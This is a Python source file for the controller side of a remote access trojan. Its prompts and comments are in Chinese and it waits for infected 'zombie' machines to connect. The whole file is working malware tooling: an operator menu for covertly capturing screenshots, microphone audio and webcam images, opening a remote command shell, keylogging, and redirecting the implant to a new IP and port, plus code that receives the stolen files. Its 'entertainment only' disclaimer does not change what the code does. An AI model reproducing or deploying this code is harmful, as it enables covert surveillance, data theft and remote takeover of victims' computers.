import os
import socket
import struct
import sys
import threading


def socket_server():
    try:
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        serverAddr = ('', 12345)
        # 释放端口
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind(serverAddr)
        server.listen(5)
        print("""
        oooo                               .o88o.            o8o         .                       oooo  
        `888                               888 `"            `"'       .o8                       `888  
         888 .oo.   oooo  oooo   .oooo.   o888oo   .ooooo.  oooo     .o888oo  .ooooo.   .ooooo.   888  
         888P"Y88b  `888  `888  `P  )88b   888    d88' `88b `888       888   d88' `88b d88' `88b  888  
         888   888   888   888   .oP"888   888    888ooo888  888       888   888   888 888   888  888  
         888   888   888   888  d8(  888   888    888    .o  888       888 . 888   888 888   888  888  
        o888o o888o  `V88V"V8P' `Y888""8o o888o   `Y8bod8P' o888o      "888" `Y8bod8P' `Y8bod8P' o888o 



                                                                                      """)
        print("欢迎使用本工具，此工具仅用于娱乐与技术交流，请勿用作非法途径，用了的话和我也没关系捏")
        print("有bug属于是正常情况捏，如果你不满意可以帮我改改捏")
        print("等待肉鸡捏")
        while True:
            # 利用循环进入无人值守的工作状态
            client, clientAddr = server.accept()
            t = threading.Thread(target=client_deal_data, args=(client, clientAddr))
            t.start()
    except socket.error as e:
        print("网络不正常")
        sys.exit(1)


def client_deal_data(client, clientAddr):
    print("有肉鸡上线,[{}]".format(clientAddr))
    while True:
        # 接收木马端的数据，为下一步做业务处理
        os.system("cls")
        print("\n")

        print("************************")
        print("**  输入数字实现功能  **")
        print("**  1>>获得屏幕截图！ **")
        print("**  2>>获得即时录音！ **")
        print("**  3>>获得即时摄像！ **")
        print("**  4>>我全都要!!!!！ **")
        print("**  5>>command mod!!  **")
        print("**  6>>开启监听键盘!  **")
        print("**  7>>修改木马配置!  **")
        print("**  0>>将军走此小道!  **")
        print("************************")
        choose = input("做出你的选择>>")
        choose = int(choose)
        if 7 >= choose >= 0:
            if choose == 1:
                num = input("要几张捏：")
            elif choose == 2:
                num = input("要录多久捏：")
            elif choose == 3:
                num = input("要拍几张捏：")
            elif choose == 4:
                num1 = input("截图要几张捏：")
                num2 = input("录音要多久捏：")
                num3 = input("照片要几张捏：")
            elif choose == 0:
                print("再见了捏")
                client.send((str(choose) + "+再见了妈妈今晚我就要远航").encode("utf-8"))
                exit(0)
            elif choose == 5:
                client.send((str(choose) + "+让我康康你葫芦里在卖什么药").encode("utf-8"))
                print("输入exit退出捏")
                while True:
                    clientmsg = client.recv(1024).decode("utf-8")
                    command = input(clientmsg + ">")
                    client.send(command.encode('utf-8'))
                    if command == "exit":
                        break
                    clientmsg = client.recv(4096)
                    print(clientmsg.decode('utf-8'))
                continue
            elif choose == 6:
                client.send((str(choose) + "+你的键盘很好，现在听我的话啦！").encode("utf-8"))
                print("进入该模式只能强退了捏")
                while True:
                    clientmsg = client.recv(1024).decode("utf-8")
                    print(clientmsg)
            elif choose == 7:
                print("注意输对捏")
                ip = input("输入新的IP捏：")
                port = input("输入新的端口捏：")
                print("确定是" + ip + ":" + port + "吗？")
                if input("y/n:") == 'y':
                    client.send((str(choose) + "+" + ip + "+" + port).encode("utf-8"))
                    clientmsg = client.recv(1024).decode("utf-8")
                    if clientmsg == "success":
                        print("改好了捏")
                    else:
                        print("不知道为啥没成功捏")
                else:
                    print("没输对也没关系捏，下次加油捏")
                os.system("pause")
                continue
            if choose != 4:
                client.send((str(choose) + "+" + num).encode('utf-8'))
                if choose != 2:
                    for i in range(int(num)):
                        recv(client)
                else:
                    recv(client)
            else:
                client.send((str(choose) + "+" + num1 + "+" + num2 + "+" + num3).encode('utf-8'))
                for i in range(int(num1) + int(num3) + 1):
                    recv(client)
        else:
            print("老实点！")
            os.system("pause")
            continue


def recv(client):
    fileInfoPackSize = struct.calcsize('128sl')
    fileInfoBasePack = client.recv(fileInfoPackSize)
    if fileInfoBasePack:
        fileName, fileSize = struct.unpack('128sl', fileInfoBasePack)
        # print("待接收文件名:{}".format(fileName))
        # print("待接收文件大小:{}".format(fileSize))
        fileName = fileName.strip(str.encode('\00'))
        newFileName = os.path.join(str.encode('./'), str.encode('new_') + fileName)
        print("开始接收木马端文件:[{}]，传输到本地后为[{}]".format(fileName, newFileName))
        # 以下为接收文件的业务代码
        tempfile = open(newFileName, 'wb')
        recvFile_size = 0
        while not recvFile_size == fileSize:
            if fileSize - recvFile_size > 1024:
                recvData = client.recv(1024)
                recvFile_size += len(recvData)
            else:
                recvData = client.recv(fileSize - recvFile_size)
                recvFile_size = fileSize
            tempfile.write(recvData)
        tempfile.close()


if __name__ == '__main__':
    socket_server()
